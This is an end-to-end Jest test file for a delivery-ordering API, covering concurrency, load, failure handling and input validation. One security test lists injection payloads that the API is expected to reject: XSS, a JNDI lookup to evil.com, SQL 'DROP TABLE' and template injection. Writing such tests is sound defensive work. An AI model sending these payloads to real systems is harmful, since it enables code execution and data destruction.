const {
  setupTestDatabase,
  cleanupTestDatabase,
  clearCollections,
  createTestUser,
  createTestService,
  createTestOrder,
  authenticateUser,
  apiRequest,
  waitForCondition,
  sleep,
  simulateNetworkError,
  simulateDatabaseError,
  app
} = require('./testSetup');

const request = require('supertest');

describe('E2E: Stress Testing and Edge Cases', () => {
  beforeAll(async () => {
    await setupTestDatabase();
  });

  afterAll(async () => {
    await cleanupTestDatabase();
  });

  beforeEach(async () => {
    await clearCollections();
  });

  describe('High-Load Stress Testing', () => {
    test('System handles 50 concurrent order creations without data corruption', async () => {
      const merchantAuth = await authenticateUser('merchant');
      
      // Create service
      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id, {
          name: 'Stress Test Service',
          price: 100
        }));

      const serviceId = serviceResponse.body._id;

      // Create 50 customers simultaneously
      const numberOfCustomers = 50;
      const customerPromises = Array.from({ length: numberOfCustomers }, (_, i) =>
        authenticateUser('customer', { 
          email: `stresstest${i}@customer.com`,
          name: `Stress Customer ${i}`
        })
      );

      const customerAuths = await Promise.all(customerPromises);

      // All customers simultaneously add to cart and checkout
      const orderPromises = customerAuths.map(async (customerAuth, index) => {
        try {
          // Add to cart
          await apiRequest('post', '/api/cart/add', customerAuth.token)
            .send({
              serviceId,
              merchantId: merchantAuth.user._id,
              quantity: Math.floor(Math.random() * 3) + 1, // 1-3 items
              price: 100
            });

          // Checkout
          const checkoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
            .send({
              deliveryInfo: {
                address: {
                  street: `${index} Stress Test Street`,
                  city: 'Load Test City',
                  coordinates: [-69.8 - (index * 0.001), 18.4 + (index * 0.001)]
                },
                contactPhone: `+1234${index.toString().padStart(6, '0')}`
              },
              paymentMethod: Math.random() > 0.5 ? 'cash' : 'card'
            });

          return {
            success: true,
            orderId: checkoutResponse.body._id,
            orderNumber: checkoutResponse.body.orderNumber,
            customerId: customerAuth.user._id
          };
        } catch (error) {
          return {
            success: false,
            error: error.message,
            customerId: customerAuth.user._id
          };
        }
      });

      const orderResults = await Promise.all(orderPromises);

      // Analyze results
      const successfulOrders = orderResults.filter(r => r.success);
      const failedOrders = orderResults.filter(r => !r.success);

      console.log(`Successful orders: ${successfulOrders.length}/${numberOfCustomers}`);
      console.log(`Failed orders: ${failedOrders.length}/${numberOfCustomers}`);

      // At least 95% should succeed under normal conditions
      expect(successfulOrders.length).toBeGreaterThan(numberOfCustomers * 0.95);

      // Verify data integrity
      const allOrdersResponse = await apiRequest('get', '/api/merchant/orders/all', merchantAuth.token);
      expect(allOrdersResponse.status).toBe(200);
      expect(allOrdersResponse.body.length).toBe(successfulOrders.length);

      // Verify no duplicate order numbers
      const orderNumbers = successfulOrders.map(o => o.orderNumber);
      const uniqueOrderNumbers = [...new Set(orderNumbers)];
      expect(uniqueOrderNumbers.length).toBe(orderNumbers.length);

      // Verify carts are cleared
      for (const customerAuth of customerAuths) {
        const cartResponse = await apiRequest('get', '/api/cart', customerAuth.token);
        expect(cartResponse.body.items).toHaveLength(0);
      }
    });

    test('Delivery assignment system handles race conditions under heavy load', async () => {
      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      // Create 20 delivery persons
      const numberOfDeliveryPersons = 20;
      const deliveryPromises = Array.from({ length: numberOfDeliveryPersons }, (_, i) =>
        authenticateUser('delivery', {
          email: `delivery${i}@stress.com`,
          deliveryInfo: {
            vehicleType: 'motorcycle',
            licensePlate: `STRESS${i}`,
            currentLocation: {
              coordinates: [-69.9 + (i * 0.001), 18.5 + (i * 0.001)]
            }
          }
        })
      );

      const deliveryAuths = await Promise.all(deliveryPromises);

      // Create 10 orders
      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      const orderIds = [];
      for (let i = 0; i < 10; i++) {
        await apiRequest('post', '/api/cart/add', customerAuth.token)
          .send({
            serviceId: serviceResponse.body._id,
            merchantId: merchantAuth.user._id,
            quantity: 1,
            price: 100
          });

        const checkoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
          .send({
            deliveryInfo: {
              address: {
                street: `${i} Race Test St`,
                city: 'Race City',
                coordinates: [-69.8 - (i * 0.01), 18.4 + (i * 0.01)]
              },
              contactPhone: `+1234567${i}90`
            },
            paymentMethod: 'cash'
          });

        orderIds.push(checkoutResponse.body._id);

        // Prepare orders
        await apiRequest('put', `/api/orders/${checkoutResponse.body._id}/status`, merchantAuth.token)
          .send({ status: 'confirmed' });
        await apiRequest('put', `/api/orders/${checkoutResponse.body._id}/status`, merchantAuth.token)
          .send({ status: 'preparing' });
        await apiRequest('put', `/api/orders/${checkoutResponse.body._id}/status`, merchantAuth.token)
          .send({ status: 'ready' });
      }

      // All delivery persons try to assign all orders simultaneously
      const assignmentPromises = [];
      for (const deliveryAuth of deliveryAuths) {
        for (const orderId of orderIds) {
          assignmentPromises.push(
            apiRequest('post', '/api/delivery/assign', deliveryAuth.token)
              .send({ orderId })
              .then(response => ({
                deliveryPersonId: deliveryAuth.user._id,
                orderId,
                success: response.status === 200,
                response
              }))
              .catch(error => ({
                deliveryPersonId: deliveryAuth.user._id,
                orderId,
                success: false,
                error: error.message
              }))
          );
        }
      }

      const assignmentResults = await Promise.all(assignmentPromises);

      // Analyze assignment results
      const successfulAssignments = assignmentResults.filter(r => r.success);
      const failedAssignments = assignmentResults.filter(r => !r.success);

      // Should have exactly 10 successful assignments (one per order)
      expect(successfulAssignments.length).toBe(10);

      // Verify no order is assigned to multiple delivery persons
      const assignmentsByOrder = {};
      successfulAssignments.forEach(assignment => {
        if (!assignmentsByOrder[assignment.orderId]) {
          assignmentsByOrder[assignment.orderId] = [];
        }
        assignmentsByOrder[assignment.orderId].push(assignment.deliveryPersonId);
      });

      Object.values(assignmentsByOrder).forEach(assignedDeliveryPersons => {
        expect(assignedDeliveryPersons.length).toBe(1);
      });

      // Verify all orders are assigned
      expect(Object.keys(assignmentsByOrder).length).toBe(10);
    });

    test('System maintains performance under sustained load', async () => {
      const startTime = Date.now();
      const testDuration = 30000; // 30 seconds
      const requestsPerSecond = 10;
      const interval = 1000 / requestsPerSecond;

      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      const responseTimings = [];
      let requestCount = 0;
      let successCount = 0;
      let errorCount = 0;

      const makeRequest = async () => {
        const requestStart = Date.now();
        requestCount++;

        try {
          // Alternate between different types of requests
          let response;
          const requestType = requestCount % 4;

          switch (requestType) {
            case 0:
              // Search request
              response = await apiRequest('get', '/api/search', customerAuth.token)
                .query({ query: 'test', location: '-69.9,18.5' });
              break;
            case 1:
              // Add to cart
              response = await apiRequest('post', '/api/cart/add', customerAuth.token)
                .send({
                  serviceId: serviceResponse.body._id,
                  merchantId: merchantAuth.user._id,
                  quantity: 1,
                  price: 100
                });
              break;
            case 2:
              // Get cart
              response = await apiRequest('get', '/api/cart', customerAuth.token);
              break;
            case 3:
              // Clear cart
              response = await apiRequest('delete', '/api/cart/clear', customerAuth.token);
              break;
          }

          const responseTime = Date.now() - requestStart;
          responseTimings.push(responseTime);

          if (response.status < 400) {
            successCount++;
          } else {
            errorCount++;
          }
        } catch (error) {
          errorCount++;
          const responseTime = Date.now() - requestStart;
          responseTimings.push(responseTime);
        }
      };

      // Execute sustained load
      while (Date.now() - startTime < testDuration) {
        await makeRequest();
        await sleep(interval);
      }

      // Calculate performance metrics
      const avgResponseTime = responseTimings.reduce((a, b) => a + b, 0) / responseTimings.length;
      const maxResponseTime = Math.max(...responseTimings);
      const minResponseTime = Math.min(...responseTimings);
      const successRate = (successCount / requestCount) * 100;

      // Sort for percentile calculations
      const sortedTimings = responseTimings.sort((a, b) => a - b);
      const p95Index = Math.floor(sortedTimings.length * 0.95);
      const p99Index = Math.floor(sortedTimings.length * 0.99);

      console.log('Performance Metrics:');
      console.log(`Total requests: ${requestCount}`);
      console.log(`Success rate: ${successRate.toFixed(2)}%`);
      console.log(`Average response time: ${avgResponseTime.toFixed(2)}ms`);
      console.log(`95th percentile: ${sortedTimings[p95Index]}ms`);
      console.log(`99th percentile: ${sortedTimings[p99Index]}ms`);
      console.log(`Max response time: ${maxResponseTime}ms`);

      // Performance assertions
      expect(successRate).toBeGreaterThan(95);
      expect(avgResponseTime).toBeLessThan(2000);
      expect(sortedTimings[p95Index]).toBeLessThan(3000);
    });
  });

  describe('Edge Case Scenarios', () => {
    test('Extremely large order with maximum items', async () => {
      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      // Create multiple services
      const services = [];
      for (let i = 0; i < 10; i++) {
        const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
          .send(createTestService(merchantAuth.user._id, {
            name: `Large Order Service ${i}`,
            price: 50 + (i * 10)
          }));
        services.push(serviceResponse.body);
      }

      // Add maximum quantity of each service to cart
      for (const service of services) {
        await apiRequest('post', '/api/cart/add', customerAuth.token)
          .send({
            serviceId: service._id,
            merchantId: merchantAuth.user._id,
            quantity: 99, // Large quantity
            price: service.price
          });
      }

      // Verify cart total
      const cartResponse = await apiRequest('get', '/api/cart', customerAuth.token);
      expect(cartResponse.status).toBe(200);
      expect(cartResponse.body.items.length).toBe(10);
      expect(cartResponse.body.total).toBeGreaterThan(50000); // Large total

      // Checkout large order
      const checkoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
        .send({
          deliveryInfo: {
            address: {
              street: 'Large Order Street',
              city: 'Big City',
              coordinates: [-69.8, 18.4]
            },
            contactPhone: '+1234567890'
          },
          paymentMethod: 'cash'
        });

      expect(checkoutResponse.status).toBe(201);
      expect(checkoutResponse.body.total).toBeGreaterThan(50000);

      // Verify order was created correctly
      const orderResponse = await apiRequest('get', `/api/orders/${checkoutResponse.body._id}`, customerAuth.token);
      expect(orderResponse.body.items.length).toBe(10);
    });

    test('Order with invalid delivery coordinates', async () => {
      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      await apiRequest('post', '/api/cart/add', customerAuth.token)
        .send({
          serviceId: serviceResponse.body._id,
          merchantId: merchantAuth.user._id,
          quantity: 1,
          price: 100
        });

      // Test various invalid coordinate scenarios
      const invalidCoordinates = [
        [181, 91], // Out of valid range
        [-181, -91], // Out of valid range
        [0, 0], // Middle of ocean
        [null, null], // Null values
        ['invalid', 'invalid'], // Non-numeric
        [], // Empty array
      ];

      for (const coords of invalidCoordinates) {
        const checkoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
          .send({
            deliveryInfo: {
              address: {
                street: 'Invalid Coord Street',
                city: 'Invalid City',
                coordinates: coords
              },
              contactPhone: '+1234567890'
            },
            paymentMethod: 'cash'
          });

        expect(checkoutResponse.status).toBe(400);
        expect(checkoutResponse.body.error).toBeDefined();
      }
    });

    test('Concurrent status updates on same order', async () => {
      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      // Create order
      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      await apiRequest('post', '/api/cart/add', customerAuth.token)
        .send({
          serviceId: serviceResponse.body._id,
          merchantId: merchantAuth.user._id,
          quantity: 1,
          price: 100
        });

      const checkoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
        .send({
          deliveryInfo: {
            address: {
              street: '123 Concurrent St',
              city: 'Concurrent City',
              coordinates: [-69.8, 18.4]
            },
            contactPhone: '+1234567890'
          },
          paymentMethod: 'cash'
        });

      const orderId = checkoutResponse.body._id;

      // Attempt multiple concurrent status updates
      const statusUpdatePromises = [
        apiRequest('put', `/api/orders/${orderId}/status`, merchantAuth.token)
          .send({ status: 'confirmed' }),
        apiRequest('put', `/api/orders/${orderId}/status`, merchantAuth.token)
          .send({ status: 'confirmed' }),
        apiRequest('put', `/api/orders/${orderId}/status`, merchantAuth.token)
          .send({ status: 'confirmed' })
      ];

      const updateResults = await Promise.allSettled(statusUpdatePromises);

      // At least one should succeed
      const successfulUpdates = updateResults.filter(r => 
        r.status === 'fulfilled' && r.value.status === 200
      );
      expect(successfulUpdates.length).toBeGreaterThan(0);

      // Verify final order status is consistent
      const finalOrderResponse = await apiRequest('get', `/api/orders/${orderId}`, customerAuth.token);
      expect(finalOrderResponse.body.status).toBe('confirmed');
    });

    test('Memory usage with large datasets', async () => {
      const initialMemory = process.memoryUsage();
      
      const merchantAuth = await authenticateUser('merchant');
      
      // Create large number of services
      const numberOfServices = 1000;
      for (let i = 0; i < numberOfServices; i++) {
        await apiRequest('post', '/api/services', merchantAuth.token)
          .send(createTestService(merchantAuth.user._id, {
            name: `Memory Test Service ${i}`,
            description: `This is a test service with a longer description to test memory usage patterns. Service number ${i} with various details and information to simulate real-world data sizes.`,
            price: Math.floor(Math.random() * 500) + 50
          }));

        // Check memory every 100 services
        if (i % 100 === 0) {
          const currentMemory = process.memoryUsage();
          const memoryIncrease = currentMemory.heapUsed - initialMemory.heapUsed;
          console.log(`Memory after ${i} services: ${Math.round(memoryIncrease / 1024 / 1024)}MB increase`);
        }
      }

      // Get all services to test retrieval performance
      const allServicesResponse = await apiRequest('get', '/api/merchant/services', merchantAuth.token);
      expect(allServicesResponse.status).toBe(200);
      expect(allServicesResponse.body.length).toBe(numberOfServices);

      const finalMemory = process.memoryUsage();
      const totalMemoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      console.log(`Total memory increase: ${Math.round(totalMemoryIncrease / 1024 / 1024)}MB`);

      // Memory should not increase excessively (threshold: 100MB)
      expect(totalMemoryIncrease).toBeLessThan(100 * 1024 * 1024);
    });
  });

  describe('Network and Database Failure Simulation', () => {
    test('System gracefully handles database connection failures during order creation', async () => {
      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      await apiRequest('post', '/api/cart/add', customerAuth.token)
        .send({
          serviceId: serviceResponse.body._id,
          merchantId: merchantAuth.user._id,
          quantity: 1,
          price: 100
        });

      // Simulate database failure
      const restoreDatabase = simulateDatabaseError();

      try {
        const checkoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
          .send({
            deliveryInfo: {
              address: {
                street: '123 DB Fail St',
                city: 'Error City',
                coordinates: [-69.8, 18.4]
              },
              contactPhone: '+1234567890'
            },
            paymentMethod: 'cash'
          });

        // Should return appropriate error
        expect(checkoutResponse.status).toBe(500);
        expect(checkoutResponse.body.error).toMatch(/database|connection/i);
      } finally {
        restoreDatabase();
      }

      // After restoring, checkout should work
      const successfulCheckoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
        .send({
          deliveryInfo: {
            address: {
              street: '123 Success St',
              city: 'Success City',
              coordinates: [-69.8, 18.4]
            },
            contactPhone: '+1234567890'
          },
          paymentMethod: 'cash'
        });

      expect(successfulCheckoutResponse.status).toBe(201);
    });

    test('System handles partial API failures gracefully', async () => {
      const customerAuth = await authenticateUser('customer');

      // Test various failure scenarios
      const testCases = [
        {
          endpoint: '/api/nonexistent',
          expectedStatus: 404
        },
        {
          endpoint: '/api/orders/invalid-id',
          expectedStatus: 400
        },
        {
          endpoint: '/api/search',
          body: { invalidQuery: 'test' },
          expectedStatus: 400
        }
      ];

      for (const testCase of testCases) {
        const response = await apiRequest('get', testCase.endpoint, customerAuth.token);
        expect(response.status).toBe(testCase.expectedStatus);
      }
    });

    test('System maintains data integrity during interrupted transactions', async () => {
      const merchantAuth = await authenticateUser('merchant');
      const customerAuth = await authenticateUser('customer');

      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      // Fill cart
      await apiRequest('post', '/api/cart/add', customerAuth.token)
        .send({
          serviceId: serviceResponse.body._id,
          merchantId: merchantAuth.user._id,
          quantity: 1,
          price: 100
        });

      const initialCartResponse = await apiRequest('get', '/api/cart', customerAuth.token);
      const initialCartItems = initialCartResponse.body.items.length;

      // Attempt checkout with invalid data to force transaction failure
      const failedCheckoutResponse = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
        .send({
          deliveryInfo: {
            address: {
              street: '', // Invalid empty street
              city: '',
              coordinates: []
            },
            contactPhone: 'invalid'
          },
          paymentMethod: 'invalid_method'
        });

      expect(failedCheckoutResponse.status).toBe(400);

      // Verify cart is unchanged after failed transaction
      const afterFailureCartResponse = await apiRequest('get', '/api/cart', customerAuth.token);
      expect(afterFailureCartResponse.body.items.length).toBe(initialCartItems);

      // Verify no orphaned order was created
      const orderHistoryResponse = await apiRequest('get', '/api/orders/history', customerAuth.token);
      expect(orderHistoryResponse.body.length).toBe(0);
    });
  });

  describe('Security and Input Validation Edge Cases', () => {
    test('System rejects malicious input attempts', async () => {
      const customerAuth = await authenticateUser('customer');

      const maliciousInputs = [
        { field: 'email', value: '<script>alert("xss")</script>@test.com' },
        { field: 'name', value: '${jndi:ldap://evil.com/x}' },
        { field: 'phone', value: '1"; DROP TABLE users; --' },
        { field: 'address', value: '{{7*7}}' },
        { field: 'coordinates', value: 'javascript:alert(1)' }
      ];

      for (const input of maliciousInputs) {
        let testData = {
          deliveryInfo: {
            address: {
              street: '123 Safe St',
              city: 'Safe City',
              coordinates: [-69.8, 18.4]
            },
            contactPhone: '+1234567890'
          },
          paymentMethod: 'cash'
        };

        // Apply malicious input to specific field
        if (input.field === 'coordinates') {
          testData.deliveryInfo.address.coordinates = input.value;
        } else if (input.field === 'address') {
          testData.deliveryInfo.address.street = input.value;
        } else if (input.field === 'phone') {
          testData.deliveryInfo.contactPhone = input.value;
        }

        const response = await apiRequest('post', '/api/orders/checkout', customerAuth.token)
          .send(testData);

        // Should reject malicious input
        expect(response.status).toBe(400);
      }
    });

    test('System handles extremely long input strings', async () => {
      const customerAuth = await authenticateUser('customer');
      const merchantAuth = await authenticateUser('merchant');

      // Test with very long strings
      const longString = 'A'.repeat(10000);
      const extremelyLongString = 'B'.repeat(100000);

      // Test service creation with long description
      const longServiceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id, {
          description: longString
        }));

      // Should handle reasonable long strings
      expect(longServiceResponse.status).toBe(201);

      // Should reject extremely long strings
      const extremeServiceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id, {
          description: extremelyLongString
        }));

      expect(extremeServiceResponse.status).toBe(400);
    });

    test('System handles rapid successive requests from same user', async () => {
      const customerAuth = await authenticateUser('customer');
      const merchantAuth = await authenticateUser('merchant');

      const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
        .send(createTestService(merchantAuth.user._id));

      // Make 100 rapid cart additions
      const rapidRequests = Array.from({ length: 100 }, () =>
        apiRequest('post', '/api/cart/add', customerAuth.token)
          .send({
            serviceId: serviceResponse.body._id,
            merchantId: merchantAuth.user._id,
            quantity: 1,
            price: 100
          })
          .catch(error => ({ status: error.response?.status || 500 }))
      );

      const results = await Promise.all(rapidRequests);

      // Some requests should be rate limited
      const rateLimitedRequests = results.filter(r => r.status === 429);
      expect(rateLimitedRequests.length).toBeGreaterThan(0);

      // But some should succeed
      const successfulRequests = results.filter(r => r.status === 200);
      expect(successfulRequests.length).toBeGreaterThan(0);
    });
  });

  describe('Resource Cleanup and Memory Management', () => {
    test('System properly cleans up abandoned carts', async () => {
      const numberOfCustomers = 20;
      
      // Create many customers with abandoned carts
      for (let i = 0; i < numberOfCustomers; i++) {
        const customerAuth = await authenticateUser('customer', { 
          email: `abandoned${i}@test.com` 
        });
        const merchantAuth = await authenticateUser('merchant', { 
          email: `merchant${i}@test.com` 
        });

        const serviceResponse = await apiRequest('post', '/api/services', merchantAuth.token)
          .send(createTestService(merchantAuth.user._id));

        // Add items but don't checkout (simulating abandonment)
        await apiRequest('post', '/api/cart/add', customerAuth.token)
          .send({
            serviceId: serviceResponse.body._id,
            merchantId: merchantAuth.user._id,
            quantity: Math.floor(Math.random() * 5) + 1,
            price: 100
          });
      }

      // Verify carts exist
      const initialCartCount = await apiRequest('get', '/api/admin/carts/count', process.env.ADMIN_TOKEN);
      expect(initialCartCount.body.count).toBe(numberOfCustomers);

      // Trigger cleanup (this would normally be a background job)
      const cleanupResponse = await apiRequest('post', '/api/admin/cleanup/abandoned-carts', process.env.ADMIN_TOKEN)
        .send({ olderThanDays: 0 }); // Clean up everything

      expect(cleanupResponse.status).toBe(200);

      // Verify cleanup occurred
      const finalCartCount = await apiRequest('get', '/api/admin/carts/count', process.env.ADMIN_TOKEN);
      expect(finalCartCount.body.count).toBe(0);
    });
  });
});